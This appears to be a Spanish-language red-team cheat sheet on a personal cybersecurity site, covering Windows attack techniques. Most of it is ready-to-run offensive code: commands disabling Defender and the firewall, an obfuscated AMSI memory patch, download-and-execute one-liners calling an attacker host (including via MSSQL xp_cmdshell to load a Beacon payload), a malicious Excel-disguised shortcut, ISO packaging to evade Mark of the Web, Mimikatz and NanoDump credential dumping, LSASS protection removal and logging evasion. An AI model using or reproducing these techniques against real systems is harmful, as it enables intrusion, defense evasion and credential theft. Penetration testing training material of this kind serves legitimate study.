@@ -1,0 +1,237 @@
+<!DOCTYPE html><!-- Layout específico para writeups en markdown. Muestra hero (si existe) y el contenido --><html lang="es" class="dark"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Writeup</title><script type="module">!function(){const t=localStorage.getItem("theme")||"dark";document.documentElement.classList.toggle("light","light"===t),document.documentElement.classList.toggle("dark","dark"===t)}();</script><link rel="stylesheet" href="/assets/apuntes.fBeTOWmP.css">
+<link rel="stylesheet" href="/assets/apuntes.sk8r29IW.css"></head> <body class="bg-bg1 text-white"> <div class="min-h-screen flex flex-col"> <!-- Header reutiliza el componente global si está disponible --> <header class="w-full py-4"> <div class="container mx-auto flex items-center justify-between"> <a href="/" class="flex items-center gap-3"> <div> <div class="text-lg font-semibold">Angel Corral</div> <div class="text-xs text-slate-400">Informatica y Ciberseguridad</div> </div> </a> <nav class="flex items-center gap-6 text-sm"> <a href="/writeups">Writeups</a> <a href="/projects">Proyectos</a> <a href="/apuntes">Apuntes</a> <a href="/services">Servicios</a> <a href="/contact" class="px-3 py-1 rounded-md border">Contacto</a> <button id="theme-toggle" class="theme-toggle" aria-label="Cambiar tema" type="button"> <svg id="sun-icon" class="hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path> </svg> <svg id="moon-icon" class="block" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path> </svg> </button> <script type="module">!function(){const e=document.getElementById("theme-toggle"),t=document.getElementById("sun-icon"),s=document.getElementById("moon-icon"),d=document.documentElement;function c(){return localStorage.getItem("theme")||"dark"}function l(e){"light"===e?(d.classList.remove("dark"),d.classList.add("light"),t.classList.remove("hidden"),t.classList.add("block"),s.classList.remove("block"),s.classList.add("hidden")):(d.classList.remove("light"),d.classList.add("dark"),s.classList.remove("hidden"),s.classList.add("block"),t.classList.remove("block"),t.classList.add("hidden")),localStorage.setItem("theme",e)}l(c()),e.addEventListener("click",()=>{l("light"===c()?"dark":"light")})}();</script> </nav> </div> </header> <main class="container mx-auto px-6 py-10 flex-1"> <article class="max-w-3xl mx-auto">  <div class="prose prose-invert prose-xl max-w-none">   <article class="max-w-3xl mx-auto px-6"> <div class="mb-12"> <a href="/apuntes" class="text-sm text-slate-400 hover:text-accentBlue transition-colors">
+← Volver a Apuntes
+</a> <h1 class="text-4xl font-bold bg-gradient-to-r from-accentBlue to-accentGreen text-transparent bg-clip-text mb-4"> PowerShell </h1>  <div class="flex flex-wrap gap-3">  </div> </div> <div class="prose prose-projects prose-invert prose-xl max-w-none"> <h2 id="1-enumeración-y-diagnóstico-del-entorno">1. Enumeración y Diagnóstico del Entorno</h2>
+<p>Herramientas para identificar defensas y configuraciones antes de lanzar ataques.</p>
+<h3 id="scripts-de-enumeración-powershell">Scripts de Enumeración (PowerShell)</h3>
+<p>PowerShell</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># Cargar módulos básicos</span></span>
+<span class="line"><span>. .\powermad.ps1</span></span>
+<span class="line"><span>. .\powerview.ps1</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Escalar privilegios locales (PowerUp)</span></span>
+<span class="line"><span>. .\PowerUp.ps1</span></span>
+<span class="line"><span>Invoke-AllChecks</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Buscar acceso WinRM/PSRemoting con privilegios de Admin</span></span>
+<span class="line"><span>. .\Find-PSRemotingLocalAdminAccess.ps1</span></span>
+<span class="line"><span>Find-PSRemotingLocalAdminAccess</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Chequear Bases de Datos SQL</span></span>
+<span class="line"><span>Import-Module .\PowerupSQL-master\PowerupSQL.psd1</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Chequear EDRs presentes</span></span>
+<span class="line"><span>Invoke-EDRChecker.ps1 -remote -computer &#x3C;NombrePC></span></span></code></pre>
+<h3 id="diagnóstico-de-binarios">Diagnóstico de Binarios</h3>
+<p>PowerShell</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># Verificar si Windows Defender detecta un archivo específico</span></span>
+<span class="line"><span>DefenderCheck.exe &#x3C;Archivo></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Modificar metadatos de un binario (Ej. cambiar ProductName para parecer legítimo)</span></span>
+<span class="line"><span>rcedit-x64.exe ms_file.dll --set-version-string "ProductName" "Vmware Workstation"</span></span></code></pre>
+<hr>
+<h2 id="2-manipulación-de-windows-defender-y-firewall">2. Manipulación de Windows Defender y Firewall</h2>
+<p>Comandos para degradar la seguridad si se tienen privilegios suficientes.</p>
+<p>PowerShell</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># Ver estado y amenazas detectadas</span></span>
+<span class="line"><span>Get-MpComputerStatus</span></span>
+<span class="line"><span>Get-MpThreat</span></span>
+<span class="line"><span>Get-MpThreatDetection</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Deshabilitar protecciones (Requiere Admin/SYSTEM)</span></span>
+<span class="line"><span>Set-MpPreference -DisableIOAVProtection $true</span></span>
+<span class="line"><span>Set-MpPreference -DisableRealtimeMonitoring $true</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Deshabilitar perfiles de Firewall</span></span>
+<span class="line"><span>Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False</span></span></code></pre>
+<hr>
+<h2 id="3-amsi-bypass-antimalware-scan-interface">3. AMSI Bypass (Antimalware Scan Interface)</h2>
+<p>AMSI inspecciona scripts (PowerShell, VBS, JS) y memoria antes de la ejecución. El bypass consiste en parchear la DLL en memoria (<code>amsi.dll</code>) para que siempre devuelva “limpio”.</p>
+<h3 id="método-c-reflection--p-invoke">Método C# (Reflection / P-Invoke)</h3>
+<p>Este script carga <code>amsi.dll</code> y parches la función <code>AmsiScanBuffer</code>.</p>
+<p>C#</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>// Definición de la clase Meow para parchear memoria</span></span>
+<span class="line"><span>$Meow = '</span></span>
+<span class="line"><span>using System;</span></span>
+<span class="line"><span>using System.Runtime.InteropServices;</span></span>
+<span class="line"><span>public class Meow {</span></span>
+<span class="line"><span>  [DllImport("kernel32")]</span></span>
+<span class="line"><span>  public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span></span>
+<span class="line"><span>  [DllImport("kernel32")]</span></span>
+<span class="line"><span>  public static extern IntPtr LoadLibrary(string name);</span></span>
+<span class="line"><span>  [DllImport("kernel32")]</span></span>
+<span class="line"><span>  public static extern void CopyMemory(IntPtr dest, IntPtr src, uint count);</span></span>
+<span class="line"><span>  [DllImport("kernel32")]</span></span>
+<span class="line"><span>  public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);</span></span>
+<span class="line"><span>  public static void cp(byte[] source, IntPtr dest, int count) {</span></span>
+<span class="line"><span>    Marshal.Copy(source, 0, dest, count);</span></span>
+<span class="line"><span>  }</span></span>
+<span class="line"><span>}</span></span>
+<span class="line"><span>';</span></span>
+<span class="line"><span>Add-Type $Meow;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>// Ejecución del parche (Patch bytes: 0xB8, 0x57...)</span></span>
+<span class="line"><span>$LoadLibrary = [Meow]::LoadLibrary("a" + "m" + "si.dll");</span></span>
+<span class="line"><span>$Address = [Meow]::GetProcAddress($LoadLibrary, "Am" + "si" + "Sc" + "an" + "Bu" + "ff" + "er");</span></span>
+<span class="line"><span>$p = 0;</span></span>
+<span class="line"><span>[Meow]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p);</span></span>
+<span class="line"><span>$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3);</span></span>
+<span class="line"><span>[Meow]::cp($Patch, $Address, 6);</span></span></code></pre>
+<h3 id="one-liners-y-ofuscación">One-Liners y Ofuscación</h3>
+<p>Técnicas para romper firmas estáticas mediante concatenación de strings o reflexión.</p>
+<p>PowerShell</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># One-liner para descargar ejecutar bypass remoto</span></span>
+<span class="line"><span>iex ((new-object net.webclient).downloadstring("http://IP_ATACANTE/meowme.ps1"))</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Matt Graeber's Reflection Bypass (Ofuscado)</span></span>
+<span class="line"><span>[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)</span></span></code></pre>
+<hr>
+<h2 id="4-inyección-de-procesos-process-injection">4. Inyección de Procesos (Process Injection)</h2>
+<p>Uso de la API de Windows (P/Invoke) para ejecutar código malicioso dentro de procesos legítimos.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th><strong>Técnica</strong></th><th><strong>Flujo de API (C/C++)</strong></th><th><strong>Descripción</strong></th></tr></thead><tbody><tr><td><strong>Classic Injection</strong></td><td><code>OpenProcess</code> -> <code>VirtualAllocEx</code> -> <code>WriteProcessMemory</code> -> <code>CreateRemoteThread</code></td><td>Inyección básica en otro proceso. Ruidosa.</td></tr><tr><td><strong>Reflective DLL</strong></td><td><code>VirtualAlloc</code> -> <code>memcpy</code> -> <code>CreateThread</code></td><td>Carga una DLL directamente desde la memoria sin tocar disco.</td></tr><tr><td><strong>Thread Hijacking</strong></td><td><code>CreateThread(SUSPENDED)</code> -> <code>GetThreadContext</code> -> <code>SetThreadContext(RIP)</code> -> <code>ResumeThread</code></td><td>Pausa un hilo existente y cambia su puntero de instrucción (RIP) al shellcode.</td></tr><tr><td><strong>APC Injection</strong></td><td><code>CreateToolhelp32Snapshot</code> -> <code>QueueUserAPC</code></td><td>Encola código asíncrono en un hilo. Se ejecuta cuando el hilo entra en estado “Alertable”.</td></tr><tr><td><strong>Early Bird APC</strong></td><td><code>CreateProcess(SUSPENDED)</code> -> <code>QueueUserAPC</code> -> <code>ResumeThread</code></td><td>Inyecta en el proceso antes de que arranque el hilo principal. Muy efectiva contra EDRs.</td></tr><tr><td><strong>Process Hollowing</strong></td><td><code>CreateProcess(SUSPENDED)</code> -> <code>NtQueryInformationProcess</code> -> <code>WriteProcessMemory</code></td><td>Vacía el código legítimo de un proceso y escribe el malicioso en el Entry Point.</td></tr></tbody></table>
+<hr>
+<h2 id="5-payloads-y-ejecución-crto-tools">5. Payloads y Ejecución (CRTO Tools)</h2>
+<p>Técnicas para empaquetar y entregar payloads evitando detecciones estáticas.</p>
+<h3 id="gadgettojscript--lnks">GadgetToJScript &#x26; LNKs</h3>
+<p>Convertir .NET assemblies a JScript y ejecutarlos vía accesos directos.</p>
+<p>PowerShell</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># Convertir DLL a JS</span></span>
+<span class="line"><span>GadgetToJScript.exe -a MyDropper.dll -w js -b -o deals</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Crear acceso directo (.lnk) malicioso</span></span>
+<span class="line"><span>$wsh = New-Object -ComObject WScript.Shell</span></span>
+<span class="line"><span>$lnk = $wsh.CreateShortcut("C:\Payloads\deals\deals.xlsx.lnk")</span></span>
+<span class="line"><span>$lnk.TargetPath = "%COMSPEC%"</span></span>
+<span class="line"><span>$lnk.Arguments = "/C start deals.xlsx &#x26;&#x26; wscript deals.js"</span></span>
+<span class="line"><span>$lnk.IconLocation = "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0"</span></span>
+<span class="line"><span>$lnk.Save()</span></span></code></pre>
+<h3 id="empaquetado-iso1">Empaquetado ISO1</h3>
+<p>Ocultar archivos maliciosos dentro de un contenedor ISO para e2vitar el “Mark of the Web” (MotW).</p>
+<p>Bash</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># Crear ISO con archivos ocultos</span></span>
+<span class="line"><span>python3 PackMyPayload.py -H deals.xlsx,deals.js /origen/ /destino/deals.iso</span></span></code></pre>
+<hr>
+<h2 id="6-robo-de-credenciales-dumping-avanzado">6. Robo de Credenciales (Dumping Avanzado)</h2>
+<h3 id="mimikatz">Mimikatz</h3>
+<p>PowerShell</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>privilege::debug</span></span>
+<span class="line"><span>sekurlsa::logonpasswords    # Dump estándar</span></span>
+<span class="line"><span>lsadump::sam                # Dump SAM (Local)</span></span>
+<span class="line"><span>lsadump::secrets            # LSA Secrets</span></span>
+<span class="line"><span>token::revert               # Volver al token original</span></span>
+<span class="line"><span>vault::list                 # Listar Windows Vault</span></span></code></pre>
+<h3 id="nanodump-stealthy-lsass-dump">NanoDump (Stealthy LSASS Dump)</h3>
+<p>Técnica avanzada para volcar LSASS evitando AV/EDR usando <code>Mockingjay</code> (DLL Hijacking) y <code>Donut</code>.</p>
+<ol>
+<li>
+<p><strong>Preparación:</strong> Usar una DLL vulnerable (ej. <code>msvcp140.dll</code> en <code>mockingjay.exe</code>) y cambiar su <code>ProductName</code> para evadir firmas.</p>
+</li>
+<li>
+<p><strong>Shellcode:</strong> Convertir <code>nanodump.x64.exe</code> a shellcode con <code>donut</code>.</p>
+<p>Bash</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>donut.exe -f 1 -p " -sc -f --write nano.dmp" -i nanodump.x64.exe -o nano.bin</span></span></code></pre>
+</li>
+<li>
+<p><strong>Ejecución:</strong> Transferir y ejecutar en la víctima (usando técnica de DLL hijacking).</p>
+</li>
+<li>
+<p><strong>Restauración:</strong> Descargar el dump y restaurar la firma para leerlo con Mimikatz.</p>
+<p>PowerShell</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>restore_signature.exe nano.dmp</span></span>
+<span class="line"><span>sekurlsa::minidump nano.dmp</span></span></code></pre>
+</li>
+</ol>
+<h3 id="mimikatz-driver-ppl-bypass">Mimikatz Driver (PPL Bypass)</h3>
+<p>Si LSASS está protegido (PPL), usar el driver de Mimikatz para desactivarlo.</p>
+<p>PowerShell</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>mimikatz.exe "!+" "!processprotect /process:lsass.exe /remove"</span></span></code></pre>
+<hr>
+<h2 id="7-controles-de-aplicación-wdac--applocker--jea">7. Controles de Aplicación (WDAC / AppLocker / JEA)</h2>
+<h3 id="windows-defender-application-control-wdac">Windows Defender Application Control (WDAC)</h3>
+<p>PowerShell</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># Leer política actual binaria</span></span>
+<span class="line"><span>path: \\c$\Windows\System32\CodeIntegrity\DG.bin.p7</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Convertir a XML para análisis</span></span>
+<span class="line"><span>ConvertTo-CIPolicy -BinaryFilePath DG.bin.p7 -XmlFilePath policy.xml</span></span></code></pre>
+<ul>
+<li><strong>Bypass:</strong> Usar LOLBins (Binarios del sistema firmados por MS) o inyección de código en procesos permitidos.</li>
+</ul>
+<h3 id="just-enough-administration-jea">Just Enough Administration (JEA)</h3>
+<p>Restricción de PowerShell a comandos específicos.</p>
+<ul>
+<li>
+<p><strong>Crear Rol:</strong> <code>New-Item ... RoleCapabilities</code>.</p>
+</li>
+<li>
+<p><strong>Configurar:</strong> <code>Register-PSSessionConfiguration</code>.</p>
+</li>
+<li>
+<p><strong>Bypass:</strong> Buscar funciones que permitan ejecutar código arbitrario o rutas no sanitizadas.</p>
+</li>
+</ul>
+<hr>
+<h2 id="8-tips--trucos-varios">8. Tips &#x26; Trucos Varios</h2>
+<h3 id="ofuscación-de-argumentos-argsplit">Ofuscación de Argumentos (ArgSplit)</h3>
+<p>Evitar el logging de línea de comandos partiendo strings en variables de entorno.</p>
+<p>DOS</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>set "z=t" &#x26; set "y=s" ...</span></span>
+<span class="line"><span>set "Pwn=%q%%r%%s%..." </span></span>
+<span class="line"><span>Loader.exe -args %Pwn%</span></span></code></pre>
+<h3 id="sql-pivoting-con-evasión">SQL Pivoting con Evasión</h3>
+<p>Inyectar comandos PowerShell ofuscados a través de MSSQL <code>xp_cmdshell</code>.</p>
+<p>SQL</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>-- Descargar y ejecutar AMSI bypass + Payload en memoria</span></span>
+<span class="line"><span>EXEC master..xp_cmdshell 'powershell -c IEX(New-Object Net.WebClient).DownloadString("http://IP/amsi.ps1"); IEX(...Beacon.ps1)'</span></span></code></pre>
+<h3 id="invishell">InviShell</h3>
+<p>Script para ejecutar PowerShell evadiendo logs de transcripción y ScriptBlock logging.</p>
+<p>DOS</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>.\InviShell\RunWithRegistryNonAdmin.bat</span></span></code></pre>
+<h3 id="portproxy-tunneling-sin-herramientas-externas">PortProxy (Tunneling sin herramientas externas)</h3>
+<p>Bash</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># Redirigir tráfico local (8080) a remoto (80)</span></span>
+<span class="line"><span>netsh interface portproxy add v4tov4 listenport=8080 connectport=80 connectaddress=192.168.100.1</span></span></code></pre> </div> <div class="mt-16 pt-8 border-t border-slate-800"> <a href="/projects" class="text-slate-400 hover:text-accentBlue transition-colors">
+← Volver a la lista de proyectos
+</a> </div> </article>   </div> </article> </main> <footer class="w-full py-6 mt-12"> <div class="container mx-auto text-sm text-slate-400">
+© 2025 Angel Corral - Todos los derechos reservados.
+</div> </footer> </div> </body></html>
